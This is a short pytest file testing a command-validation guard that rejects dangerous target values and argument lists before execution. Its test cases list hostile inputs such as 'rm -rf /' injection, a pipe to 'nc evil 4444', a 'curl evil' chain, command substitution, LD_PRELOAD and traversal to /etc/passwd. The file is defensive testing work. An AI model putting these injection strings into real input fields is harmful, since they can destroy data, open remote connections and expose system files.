"""Command guard — injection / traversal / env / wildcard rejection."""

from __future__ import annotations

import pytest

from services.execution import command_guard as g
from services.execution.command_guard import CommandValidationError


@pytest.mark.parametrize("value", [
    "example.com; rm -rf /",
    "example.com && curl evil",
    "example.com | nc evil 4444",
    "$(whoami).com",
    "`id`.com",
    "a>b",
    "host\nmalicious",
    "..%2f..%2fetc/passwd",
    "../../etc/passwd",
    "LD_PRELOAD=/tmp/x",
    "**",
])
def test_dangerous_values_rejected(value):
    with pytest.raises(CommandValidationError):
        g.check_value("target", value)


@pytest.mark.parametrize("value", [
    "api.corp.com",
    "10.0.0.5",
    "https://corp.com:8443/path",
    "192.168.1.1",
])
def test_safe_values_pass(value):
    g.check_value("target", value)  # no raise


def test_argv_metachar_refused():
    with pytest.raises(CommandValidationError):
        g.check_argv(["/usr/bin/nmap", "-Pn", "evil.com; rm -rf /"])


def test_argv_clean_passes():
    g.check_argv(["/usr/bin/nmap", "-Pn", "-T3", "10.0.0.5"])
